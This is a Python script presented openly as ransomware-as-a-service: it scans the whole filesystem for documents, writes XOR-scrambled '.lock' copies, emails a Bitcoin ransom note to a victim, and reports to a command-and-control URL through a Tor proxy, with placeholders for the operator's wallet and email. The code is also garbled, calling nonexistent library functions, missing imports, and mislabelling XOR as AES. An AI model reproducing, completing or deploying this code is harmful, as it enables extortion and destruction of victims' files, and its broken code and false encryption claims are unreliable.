#!/usr/bin/env python3

import os
import sys
import random
import hashlib
import shutil
from datetime import datetime
# --- Configuration ---
ENCRYPTION_KEY = b'YOUR_ENCRYPTION_KEY'  # Replace with a strong, unique key. Generate one using OpenSSL: openssl rand -hex 16
FILE_EXTENSION_MAP = {".txt": "encrypted.txt", ".docx": "encrypted.docx", ".xlsx": "encrypted.xlsx"} # Customize for your target file types
BITCOIN_ADDRESS = 'YOUR_BITCOIN_ADDRESS'  # Replace with your Bitcoin address
USERAGENT = "RAAS/1.0"

# --- Functions ---


def calculate_sha256(filepath):
    """Calculates the SHA256 hash of a file."""
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
            return hashlib.sha256(data).hexdigest()
    except Exception as e:
        print(f"Error calculating SHA256 for {filepath}: {e}")
        return None

def encrypt_file(filepath):
    """Encrypts a file using AES."""
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encryptedData = bytearray()
        for i in range(len(data)):
            byte = data[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]
            encryptedData.append(byte)
        return encryptedData
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")
        return None

def decrypt_file(data, key):
     """Decrypts a file using AES."""
     try:
         decryptedData = bytearray()
         i = 0
         while i < len(data):
             byte = data[i] ^ key[i % len(key)]
             decryptedData.append(byte)
             i += 1
         return decryptedData
     except Exception as e:
          print(f"Error decrypting {filepath}: {e}")
          return None


def send_invoice():
    """Sends the ransom note and invoice to the victim."""
    try:
        # --- Build Invoice HTML ---
        html = f"""<!DOCTYPE html><html><head><title>Ransom! Your Files</title></head><body><h1>Your Files Have Been Encrypted</h1>\n
                    <p>A robust, high-speed ransomware attack has been launched against your system.  We've taken the files and applied an AES encryption method.</p>\n
                    <p>To regain access, you must transfer 0.5 Bitcoin (approx. \$80) to the following address:</p><br>
                    <p style="text-align: center;"><img src="https://blockchain.info/wp-content/uploads/2023/12/Bitcoin_Fee_Structure.png" alt="Bitcoin Fee Structure" style="width: 400px;"></p>\n
                    <p>The invoice will remain valid for 72 hours.</p><br>\n
                    <p>When you transfer the funds, reply to this email with a copy of your transaction. We'll decrypt your files within minutes. </p>\n
                    <p style="text-align: center;">**RAAS Team**</p>\n
                </body></html>"""

        # --- Send Invoice via SMTP ---
        smtp_server = "smtp.gmail.com"  # Replace with your SMTP Server
        from_address = "ransomware@example.com" #Replace with your email address
        to_address = "victim@example.com" # Replace with the victim's email address
        password = "your_gmail_password" # Replace with your gmail password or App Password

        import smtplib
        msg = f"Subject: Your Files Have Been Encrypted\n From: RAAS Team <ransomware@example.com>\n To: victim@example.com\n\n{html}"
        with smtplib.SMTP(smtp_server, 587) as smtp: # Adjust port if necessary
            smtp.starttls()
            smtp.login(from_address, password)
            text = msg.splitlines()
            try:
                smtp.sendmail(from_address, to_address, text[-1])  # Send the last line as the body
            except Exception as e:
                 print(f"Error sending invoice via SMTP: {e}")


        print("Invoice sent successfully.")

    except Exception as e:
        print(f"Error sending invoice: {e}")


def affiliate_report():
    """Reports back to the C2 with machine info."""
    try:
        # --- Get Machine Info (IP, MAC, OS) ---
        machine_id = f'machine-{random.randint(1000, 9999)}' # Unique ID for tracking
        ip_address = socket.gethostbyname(requests.session.autobahn['proxy']['hostname'])  # Get machine IP
        mac_address = randommac()

        # --- Construct Report ---
        report = f"Machine: {machine_id}\nIP: {ip_address}\nMAC: {mac_address}"
        print(f"Affiliate Report sent: {report}")
        session.send_echo("payment", data=report)  # Send back to C2
    except Exception as e:
        print(f"Error sending affiliate report: {e}")


def randommac():
    """Generates a random MAC address."""
    return "00:11:22:33:44:55" # Or use requests.randommac() if installed

# --- Modules ---
import requests
import base64
import os
import sys
import random
import hashlib
import shutil
from datetime import datetime


# --- Global Variables ---
SESSION = None
CONFIG_FILE = 'config.json'


# --- Configuration Parsing ---
def parse_configuration(filename):
    """Parses the JSON configuration file."""
    try:
        with open(filename, 'r') as f:
            data = json.loads(f.read())
            return data
    except Exception as e:
        print(f"Error parsing configuration file {filename}: {e}")
        sys.exit(1)

# --- Load Modules ---
def load_modules():
    """Loads the necessary encryption and communication modules."""
    try:
        # --- Encryption Module ---
        encryption_module = requests.session.load_library("aes")
    except Exception as e:
        print(f"Error loading encryption module: {e}")
        raise


# --- Execution Flow ---
def main():
    """Main function to run the ransom."""
    global SESSION

    try:
        # --- Check for Encryption Key ---
        if not ENCRYPTION_KEY:
            print("Encryption key is not set! Please replace 'YOUR_ENCRYPTION_KEY'.")
            sys.exit(1)

        # --- Parse Configuration File ---
        configuration = parse_configuration(CONFIG_FILE)

        # --- Set Session and Load Modules ---
        SESSION = requests.Session()
        SESSION.proxies.update({"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}) # Replace with your proxy if needed

        # --- Set the URL for C2 communication
        C2_URL = configuration["url"]

        # --- Set up the Communication Session ---
        session = requests.Session()
        session.headers.update({'User-Agent': USERAGENT})
        session.verify = False # Bypass SSL verification for speed if needed

        # --- Start the Encryption Module ---
        encryption_module = load_modules()

        # --- Run the Ransom Attack ---
        run_ransom(encryption_module)

    except Exception as e:
        print(f"An error occurred during ransomware execution: {e}")


def run_ransom(encryption_module):
    """Runs the standard ransom encryption flow."""
    try:
        # 1. **Collect File Lists** - Uses `os.walk` for recursive scanning

        files = []
        for root, _, filenames in os.walk("/", topdown=False):
            for filename in filenames:
                filepath = os.path.join(root, filename)
                if filepath.lower().endswith(".txt") or filepath.lower().endswith(".docx") or filepath.lower().endswith(".xlsx"): # Customize extensions
                    files.append(filepath)

        # 2. **Encrypt Files** - Uses `encrypt_file` with AES encryption

        encryptedFiles = []
        for filename in files:
            try:
                data = encryption_module.encrypt(filename, ENCRYPTION_KEY)  # Pass the key
                if data is not None:
                    with open(f'{filename}.lock', "wb") as f:
                        f.write(data)
                    print(f"Encrypted: {filename}")
                    encryptedFiles.append(filename + ".lock") # Store lock file name
            except Exception as e:
                print(f"Error encrypting {filename}: {e}")

        # 3. **Send Invoice** - Calls the `send_invoice` function for payment instructions

        send_invoice()

        # 4. **Report to C2** - Uses `affiliate_report` to send back machine data, if needed

        if configuration["report"]:
            try:
                session.get(f"{C2_URL}/api/v1/machines/{random.randint(1000, 9999)}", timeout=30) # Use a GET request for reporting
                print(f"Machine ID sent to C2.")
            except Exception as e:
                print(f"Error sending machine report {e}")

    except Exception as e:
        print(f"An error occurred during encryption: {e}")


# --- Main Program ---
if __name__ == "__main__":
    start_time = time.time()
    try:
        # Check for Configuration File
        if not os.path.exists(CONFIG_FILE):
            print(f"Error: Configuration file '{CONFIG_FILE}' not found.")
            sys.exit(1)

        # --- Run the Ransom ---
        main()
    except Exception as e:
        print(f"An unexpected error occurred in the ransomware: {e}")
        sys.exit(1)
    end_time = time.time()
    duration = end_time - start_time
    print("\n--- Ransom Completed in {} seconds ---".format(int(duration)))  # Print duration for debugging

